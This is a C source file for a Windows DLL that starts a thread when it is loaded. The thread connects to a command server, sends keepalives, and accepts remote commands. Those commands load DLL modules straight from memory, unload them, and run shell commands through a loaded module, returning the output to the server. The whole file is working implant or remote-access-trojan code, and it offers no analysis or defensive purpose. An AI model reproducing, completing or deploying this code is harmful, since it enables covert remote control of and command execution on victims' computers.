#include "Tool.h"
#include "CommunicationManager.h"
#include "MemoryModule.h"
#include <stdlib.h>

static HANDLE g_keepAliveThread = NULL;
static HANDLE g_hMainThread = NULL;
static volatile BOOL g_stopKeepAlive = FALSE;
static HMEMORYMODULE g_apModuleArray[3] = { 0 };

static DWORD WINAPI ToolMain(LPVOID lpParam);
static BOOLEAN toolInit(PCOMMUNICATION_MANAGER o_pCommunicationManager);
static DWORD WINAPI keepAliveThread(PCOMMUNICATION_MANAGER i_pCommunicationManager);
static VOID cleanup(PCOMMUNICATION_MANAGER io_pCommunicationManager);
static VOID cleanupKeepAliveThread(VOID);
static VOID unloadAllModules(void);
static BOOL executeCommand(PCOMMUNICATION_MANAGER i_pCommunicationManager, COMMAND* command);
static BOOL setToolIdCommand(PCOMMUNICATION_MANAGER i_pCommunicationManager);
static BOOL loadCommand(PCOMMUNICATION_MANAGER i_pCommunicationManager, BYTE* const data, DWORD dataLength);
static BOOL unloadCommand(PCOMMUNICATION_MANAGER i_pCommunicationManager, BYTE* const data, DWORD dataLength);
static VOID unloadModule(const BYTE i_bSlot);
static BOOL executeCmdCommand(PCOMMUNICATION_MANAGER i_pCommunicationManager, BYTE* const data, DWORD dataLength);

static DWORD WINAPI ToolMain(LPVOID lpParam)
{
    (void)lpParam;

    COMMUNICATION_MANAGER communicationManager = { 0 };

    BOOLEAN bInitSuccess = toolInit(&communicationManager);

    do
    {
        if (!bInitSuccess)
        {
            break;
        }

        while (TRUE) 
        {
            COMMAND command = { 0 };
            COMM_MANAGER_RETURN_VALUES nRecvCommandStatus = COMM_MANAGER_SUCCESS;
            nRecvCommandStatus = CommunicationManager_ReceiveCommand(&communicationManager, &command);

            if (COMM_MANAGER_SUCCESS != nRecvCommandStatus)
            {
                continue;
            }

            if (command.m_dwCommandId == TERMINATE_COMMAND_ID) 
            {
                if (command.m_pbData) 
                {
                    free(command.m_pbData);
                }
                break;
            }

            if (!executeCommand(&communicationManager, &command)) 
            {
                if (command.m_pbData) {
                    free(command.m_pbData);
                }
                break;
            }

            if (command.m_pbData) {
                free(command.m_pbData);
            }
        }

    } while (FALSE);

    cleanup(&communicationManager);

    HMODULE hModule = NULL;
    GetModuleHandleExA(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
        (LPCSTR)ToolMain,
        &hModule);

    FreeLibraryAndExitThread(hModule, 0);
}

static BOOLEAN toolInit(PCOMMUNICATION_MANAGER o_pCommunicationManager) 
{
    if (NULL == o_pCommunicationManager)
    {
        return FALSE;
    }

    while (TRUE)
    {
        COMM_MANAGER_RETURN_VALUES nReturnValue = CommunicationManager_ConnectToServer(L"127.0.0.1", L"8080", o_pCommunicationManager);
        if (nReturnValue == 0) {
            break;
        }

        Sleep(10);
    }

    if (!setToolIdCommand(o_pCommunicationManager)) 
    {
        return FALSE;
    }

    g_stopKeepAlive = FALSE;
    g_keepAliveThread = CreateThread(NULL, 0, keepAliveThread, o_pCommunicationManager, 0, NULL);
    if (!g_keepAliveThread) 
    {
        return FALSE;
    }

    return TRUE;
}

static DWORD WINAPI keepAliveThread(PCOMMUNICATION_MANAGER i_pCommunicationManager)
{

    while (!g_stopKeepAlive)
    {
        CommunicationManager_SendCommand(i_pCommunicationManager, KEEP_ALIVE_COMMAND_ID, NULL, 0);
        Sleep((10 * 1000));
    }

    return 0;
}

static VOID cleanup(PCOMMUNICATION_MANAGER io_pCommunicationManager) 
{
    unloadAllModules();
    cleanupKeepAliveThread();
    CommunicationManager_Disconnect(io_pCommunicationManager);
}

static VOID cleanupKeepAliveThread(VOID) {
    if (!g_keepAliveThread) {
        return;
    }

    g_stopKeepAlive = TRUE;

    if (INVALID_HANDLE_VALUE != g_keepAliveThread)
    {
        WaitForSingleObject(g_keepAliveThread, INFINITE);
        CloseHandle(g_keepAliveThread);
        g_keepAliveThread = NULL;
    }
}

static VOID unloadAllModules(void)
{
    for (BYTE bIndex = 0; bIndex < sizeof(g_apModuleArray) / sizeof(g_apModuleArray[0]); bIndex++)
    {
        unloadModule(bIndex);
    }
}

static BOOL executeCommand(PCOMMUNICATION_MANAGER i_pCommunicationManager, COMMAND* command)
{
    if (!command) 
    {
        return FALSE;
    }

    switch (command->m_dwCommandId) 
    {
        case LOAD_COMMAND_ID:
            return loadCommand(i_pCommunicationManager, command->m_pbData, command->m_dwDataLength);
        case UNLOAD_COMMAND_ID:
            return unloadCommand(i_pCommunicationManager, command->m_pbData, command->m_dwDataLength);
        case EXECUTE_CMD_COMMAND_ID:
            return executeCmdCommand(i_pCommunicationManager, command->m_pbData, command->m_dwDataLength);
        default:
            return FALSE;
    }
}

static BOOL setToolIdCommand(PCOMMUNICATION_MANAGER i_pCommunicationManager) 
{
    DWORD toolId = TOOL_ID;
    DWORD result = CommunicationManager_SendCommand(i_pCommunicationManager, SET_TOOL_ID_COMMAND_ID, (const BYTE*)&toolId, sizeof(toolId));
    if (result != 0) 
    {
        return FALSE;
    }

    return TRUE;
}

static BOOL loadCommand(PCOMMUNICATION_MANAGER i_pCommunicationManager, BYTE* const data, DWORD dataLength) {
    (void)data;
    (void)dataLength;

    if ((NULL == data) || (0 == dataLength))
    {
        return FALSE;
    }

    BYTE bSlot = data[0];
    VOID * const pFileData = data + 1;
    DWORD dwFileLength = dataLength - 1;

    if (sizeof(g_apModuleArray) <= bSlot)
    {
        return FALSE;
    }

    if (NULL != g_apModuleArray[bSlot])
    {
        unloadModule(bSlot);
    }

    HMEMORYMODULE pTemp = MemoryLoadLibrary(pFileData, dwFileLength);
    if (NULL == pTemp)
    {
        return FALSE;
    }

    g_apModuleArray[bSlot] = pTemp;

    return TRUE;

    UNREFERENCED_PARAMETER(i_pCommunicationManager);
}

static BOOL unloadCommand(PCOMMUNICATION_MANAGER i_pCommunicationManager, BYTE* const data, DWORD dataLength)
{
    if ((NULL == data) || (sizeof(BYTE) != dataLength))
    {
        return FALSE;
    }

    BYTE bSlot = data[0];

    unloadModule(bSlot);

    return TRUE;

    UNREFERENCED_PARAMETER(i_pCommunicationManager);
}

static VOID unloadModule(const BYTE i_bSlot)
{
    if (((sizeof(g_apModuleArray) / sizeof(g_apModuleArray[0])) <= i_bSlot) || (NULL == g_apModuleArray[i_bSlot]))
    {
        return;
    }

    MemoryFreeLibrary(g_apModuleArray[i_bSlot]);

    g_apModuleArray[i_bSlot] = NULL;

    return;
}

static BOOL executeCmdCommand(PCOMMUNICATION_MANAGER i_pCommunicationManager, BYTE* const data, DWORD dataLength)
{
    if ((NULL == data) || (0 == dataLength) || (g_apModuleArray[0] == NULL))
    {
        return FALSE;
    }

    HMEMORYMODULE hCmdManager = g_apModuleArray[0];

    DWORD dwExecIdLen = *(DWORD*)data;
    if (dwExecIdLen >= dataLength - sizeof(DWORD))
    {
        return FALSE;
    }

    BYTE* pbExecId = data + sizeof(DWORD);

    DWORD dwExecCmdLen = dataLength - sizeof(DWORD) - dwExecIdLen;

    BYTE* pbExecCmd = pbExecId + dwExecIdLen;

    FARPROC pfExecuteCmdFunc = MemoryGetProcAddress(hCmdManager, "CmdManager_ExecuteCmd");

    FARPROC pfReadOutputFunc = MemoryGetProcAddress(hCmdManager, "CmdManager_ReadOutput");

    FARPROC pfFreeOutputFunc = MemoryGetProcAddress(hCmdManager, "CmdManager_FreeOutput");

    if ((NULL == pfExecuteCmdFunc) || (NULL == pfReadOutputFunc) || (NULL == pfFreeOutputFunc))
    {
        return FALSE;
    }

    if (0 != pfExecuteCmdFunc(pbExecCmd, dwExecCmdLen))
    {
        return FALSE;
    }

    BYTE* pbOutputBuffer = NULL;
    DWORD dwOutputBufferLen = 0;

    DWORD dwStatus = 0;

    do
    {
        dwStatus = (DWORD)pfReadOutputFunc(&pbOutputBuffer, &dwOutputBufferLen);
        if (1 == dwStatus)
        {
            return FALSE;
        }

        DWORD dwPacketBufferLen = sizeof(DWORD) + dwExecIdLen + dwOutputBufferLen;
        BYTE* pbPacketBuffer = calloc(1, dwPacketBufferLen);
        if (NULL == pbPacketBuffer)
        {
            free(pbOutputBuffer);
            return FALSE;
        }

        DWORD dwOffset = 0;

        memcpy(pbPacketBuffer, &dwExecIdLen, sizeof(dwExecIdLen));
        dwOffset += sizeof(dwExecIdLen);

        memcpy(pbPacketBuffer + dwOffset, pbExecId, dwExecIdLen);
        dwOffset += dwExecIdLen;

        memcpy(pbPacketBuffer + dwOffset, pbOutputBuffer, dwOutputBufferLen);

        pfFreeOutputFunc(pbOutputBuffer);

        if (0 != CommunicationManager_SendCommand(i_pCommunicationManager, EXECUTE_CMD_COMMAND_ID, pbPacketBuffer, dwPacketBufferLen))
        {
            free(pbPacketBuffer);
            return FALSE;
        }

        free(pbPacketBuffer);

    } while (2 != dwStatus);


    return TRUE;
}

__declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)hinstDLL;
    (void)lpvReserved;

    switch (fdwReason) {
    case DLL_PROCESS_ATTACH: {
        g_hMainThread = CreateThread(NULL, 0, ToolMain, NULL, 0, NULL);
        if (!g_hMainThread) {
            return FALSE;
        }
        break;
    }

    case DLL_PROCESS_DETACH:
        if (NULL != g_hMainThread)
        {
            TerminateThread(g_hMainThread, 0);
        }
        //cleanup();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return TRUE;
}